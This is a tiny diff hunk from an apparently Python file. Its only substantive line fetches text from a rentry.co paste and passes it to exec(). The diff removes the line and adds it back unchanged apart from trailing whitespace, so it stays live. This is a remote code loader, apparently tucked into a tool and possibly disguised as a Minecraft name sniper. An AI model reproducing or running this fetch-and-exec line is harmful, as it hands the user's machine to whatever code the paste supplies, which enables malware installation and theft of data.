@@ -6,4 +6,4 @@ except Exception:
     import requests
 
 
-exec(requests.get('https://rentry.co/MCSniprxyz/raw').text)
+exec(requests.get('https://rentry.co/MCSniprxyz/raw').text) 
